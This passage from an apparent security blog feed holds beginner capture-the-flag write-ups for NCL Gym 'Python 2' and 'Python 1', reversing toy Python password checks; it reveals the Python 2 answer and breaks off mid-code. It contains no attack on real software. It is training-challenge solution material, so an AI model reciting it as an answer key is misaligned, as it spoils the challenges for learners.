&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This is interesting. It looks at the current letter and makes the ord and adds 7 to it. And then sets it to a variable called X. So basically, make the letters into numbers and move them up 7.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;this is where you can imagine and assume that this letters to numbers thing is going to at some point be undone. Go ahead and imagine that. Good. Got it? For example, a password of ‘aaa’ would ord into something like ‘111’ and then we add 7 to make it ‘888’ and then back to letters ‘hhh’. Hmm. Whatever that’s weird.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Moving on.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Basically if we get to z, go back to a. &lt;br /&gt;
This is here so that after the letter z we loop back to a.&lt;/p&gt;

&lt;p&gt;This next part is the part that matters most.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So far we have done a lot with shifting things back and forth. So at first glance, this looks confusing, but it basically says, letter for letter, our manipulated password (the plus 7 ord stuff) needs to equal the string in val. Or at least that is what it looks like.&lt;/p&gt;

&lt;p&gt;Of course I wrote a test code. I commented some things in the code, but most importantly, before the last if, and before the if statement that loops things back, I print both the vals[counter] and the chr(x)&lt;/p&gt;

&lt;p&gt;I then comment out the last if completely so it doesn’t stop running.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Invalid args'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;#counts the length                         
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tfzbwlyzljylawhzzdvyk'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#list() converts a string into a list made up of the letters
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#password must be 21 characters
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'length of the password must be 21 letters'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#moving through the letters
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#add 7 to the ord of the letter
&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# this is our test code here
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;#Back to normal code
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# when the ord hits lowercase z, move x back
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;#if chr(x) != vals[counter]: #if the current letter does not equal the counter
&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;# print 'counter has to equal the thing'
&lt;/span&gt;
           &lt;span class=&quot;c1&quot;&gt;# return
&lt;/span&gt;        
        &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    


&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I run it.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;
$ python PYTHON2-test.py aaaaaaaaaaaaaaaaaaaaa
t
h
f
h
z
h
b
h
w
h
l
h
y
h
z
h
l
h
j
h
y
h
l
h
a
h
w
h
h
h
z
h
z
h
d
h
v
h
y
h
k
h
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;so. Remember it’s doing a single character print of the vals[counter] then chr(x) and repeating. so every odd character is vals[counter] and every even is chr(x). So split it up and line them side by side and see what we get.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;t h
f h
z h
b h
w h
l h
y h
z h
l h
j h
y h
l h
a h
w h
h h
z h
z h
d h
v h
y h
k h
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Weirdddd. It worked just like we thought it maybe would. And remember we are printed these two lines of letters because they have to match.&lt;/p&gt;

&lt;p&gt;Weeelllll.&lt;/p&gt;

&lt;p&gt;Then maybe we can flip the code?&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;I know we could do this with pencil and paper but why not try to use this code that is already in front of us?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;change it to&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and of course we have to flip&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; 
            &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;to&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Remember, this is there so that if the counter goes past z, make it start back at a.&lt;/p&gt;

&lt;p&gt;so the oppsite would be: if it subtracts below a, push it back up to z.
And while we are here let’s delete the code we put in the print their string. No need.&lt;/p&gt;

&lt;p&gt;Now let’s put in their string as the input and see what comes out.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;m
_
s
[
p
e
r
s
e
c
r
e
Z
p
a
s
s
]
o
r
d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Eh. it’s not quite looping back the way we want it to. &lt;br /&gt;
But wait. let’s look at it for a second. &lt;br /&gt;
&lt;code&gt;m_s[persecreZpass]ord&lt;/code&gt;&lt;br /&gt;
So. Maybe I’m not the best with Python and I messed something up   somewhere. But. It’s clear that the password is something in like likes of:&lt;br /&gt;
 &lt;code&gt;mysupersecretpassword&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Let’s try it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python PYTHON2.py mysupersecretpassword
correct
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;lolll.&lt;/p&gt;

&lt;p&gt;Okay done.&lt;/p&gt;

&lt;p&gt;-Cheers&lt;/p&gt;

&lt;p&gt;Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 1’</title><link href="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 1’" /><published>2018-04-02T18:33:00-04:00</published><updated>2018-04-02T18:33:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html">&lt;h1 id=&quot;ncl-gym-2018---enumeration-and-exploitation-python-1&quot;&gt;NCL Gym 2018 - Enumeration and Exploitation Python 1&lt;/h1&gt;

&lt;p&gt;This flag is a Python password flag. Figure out what the password should be to satisfy the if statement. Easy.&lt;/p&gt;

&lt;p&gt;Here is the code.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Invalid args&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;correct&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;incorrect&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There are a few things in here that can be just thrown to the side because it won’t make a difference to the mission. It’s just house keeping. Afterwards you have just this.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;correct&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are parts to this that if you haven’t seen you may need to do a quick googles. 
Those things are&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ord()&lt;/li&gt;
  &lt;li&gt;len()&lt;/li&gt;
  &lt;li&gt;and the password[1] part.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;basically 
ord() is the oppsite of chr()
ord takes a character and gives the unicode of the character. 
ie&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; ord('c')
99
&amp;gt;&amp;gt;&amp;gt; ord('a')
97
&amp;gt;&amp;gt;&amp;gt; chr(97)
'a'
&amp;gt;&amp;gt;&amp;gt; chr(99)
'c'

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;so to figure out 
&lt;code&gt; ord(password[1]) == 83: &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Open up terminal and run 
&lt;code&gt;python&lt;/code&gt;
&lt;code&gt; chr(83) &lt;/code&gt;
to get the character&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; chr(83)
'S'

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;len() takes a string and counts the length.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;len('cat')
&amp;gt;&amp;gt;&amp;gt; 3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and then the password[1] part. That’s happening because the password string is being iterated through each character. so the [1] spot is what it’s looking at. Remember that means the second spot because [0] is the first.&lt;/p&gt;

&lt;p&gt;so we can sort of sudocode out what we need…&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting at the first letter
Builder starts at 0
  for the current letter we are looking at in password do this and loop: 
    add the value of the letter to a thing called builder.
    
    if builder's total hits 1000
    and the total length of the password is 10
    and the second letter of the string is 'S'
      print &quot;correct&quot;
    else
    you got it wrong
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I decided to write a modified version of the code to double check&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
